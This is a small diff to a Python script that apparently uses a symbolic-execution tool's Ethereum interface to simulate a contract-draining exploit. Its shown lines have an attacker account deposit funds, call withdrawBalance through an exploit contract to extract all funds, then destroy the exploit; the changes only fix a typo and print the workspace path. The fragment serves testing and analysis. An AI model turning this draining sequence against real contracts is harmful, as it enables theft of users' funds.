@@ -115,7 +115,7 @@ contract_account.addToBalance(value=100000000000000000)
 print "[+] Let attacker deposit some small amount using exploit"
 exploit_account.proxycall(ABI.make_function_id('addToBalance()'), value=100000000000000000)
 
-print "[+] Let attacker extract all  using exploit" 
+print "[+] Let attacker extract all using exploit" 
 exploit_account.proxycall(ABI.make_function_id('withdrawBalance()'))
 
 print "[+] Let attacker destroy the exploit andprofit" 
@@ -126,4 +126,5 @@ print " user_account %x balance: %d"%  (user_account, seth.get_balance(user_acco
 print " contract_account %x balance: %d"%  (contract_account, seth.get_balance(contract_account))
 
 seth.finalize()
+print "[+] Look for results in %s"% seth.workspace
 
